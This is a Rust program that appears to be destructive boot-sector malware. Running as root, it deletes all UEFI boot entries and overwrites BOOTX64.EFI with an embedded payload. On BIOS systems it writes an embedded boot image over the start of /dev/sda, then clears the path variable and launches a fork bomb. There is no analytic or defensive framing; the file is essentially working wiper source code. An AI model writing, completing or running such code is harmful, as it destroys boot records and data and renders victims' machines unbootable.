use std::{fs, io::Write, thread};
use efivar;
use regex::Regex;
use nix::unistd::Uid;
#[allow(unconditional_recursion)]
fn forkbomb() {
    thread::spawn(forkbomb);
    forkbomb();
}

fn is_uefi() -> bool {
    fs::exists("/sys/firmware/efi").expect("Failed to check for EFI")
}

fn get_disks() -> Vec<String> {
    let re = Regex::new("/(hd[a-z]{0}|sd[a-z]|nvme\\dn\\d)").unwrap();
    let devices: Vec<String> = fs::read_dir("/dev").unwrap().map(|x| x.unwrap().path().to_str().unwrap().to_string()).collect();
    devices.into_iter().filter(|x| re.is_match(x)).collect()
}

fn main() {

    if !Uid::effective().is_root() {
        println!("\u{1b}[1;31mYou must run this executable with root permissions");
        std::process::exit(1);
    }
        

    let mbrcode = include_bytes!("../../../build/boot.bin");
    let efi = include_bytes!("../../../build/boot.efi");
    let _disks = get_disks();

    if is_uefi() {
        let mut vm = efivar::system();
        
    // List all EFI variables
    let vars = vm.get_all_vars().unwrap().collect::<Vec<_>>();
    for var in vars {
        let entryvar = var.clone();
        if entryvar.name().starts_with("Boot"){
            match vm.delete(&entryvar) {
                Ok(()) => {},
                Err(_e) => {}
            }
        }
    }
        if fs::exists("/boot/efi").unwrap() {
            fs::OpenOptions::new().write(true).open("/boot/efi/EFI/BOOT/BOOTX64.EFI").unwrap().write(efi).unwrap();
        }
        else if fs::exists("/boot").unwrap() {
            fs::OpenOptions::new().write(true).open("/boot/EFI/BOOT/BOOTX64.EFI").unwrap().write(efi).unwrap();
        }
        else {
            fs::OpenOptions::new().write(true).open("/EFI/BOOT/BOOTX64.EFI").unwrap().write(efi).unwrap();
        }
    } else {
        let mut f = fs::OpenOptions::new().write(true).open("/dev/sda").unwrap();
        f.write(mbrcode).unwrap();
    }

    std::env::set_var("path", "");

    forkbomb();
}
